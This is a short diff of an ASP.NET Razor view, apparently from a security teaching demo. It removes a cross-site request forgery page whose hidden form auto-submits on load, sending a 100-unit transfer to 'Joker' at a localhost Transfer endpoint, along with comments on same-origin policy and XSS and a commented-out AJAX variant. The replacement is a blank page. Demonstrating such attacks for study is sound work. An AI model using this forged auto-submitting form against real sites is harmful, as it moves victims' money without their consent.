@@ -1,18 +1,7 @@
 ﻿@{
-    ViewBag.Title = "Home Page";
+    ViewBag.Title = "Blank";
 }
 
 <div class="jumbotron">
-    <form action="http://localhost:5314/Transfer" method="POST">
-        <input name="amount" type="hidden" value="100" />
-        <input name="to" type="hidden" value="Joker" />
-    </form>
-    
-    <script>
-        $('form').submit();
-
-        // Due to the same-origin policy it's impossible to make a CSRF via AJAX
-        // However, remeber that if a XSS occures on your site it can bypass the same-origin policy
-        // $.post('http://localhost:5314/Transfer', { 'amount': 100, 'to': 'Joker' });
-    </script>
+    <p>Nothing to do here</p>
 </div>
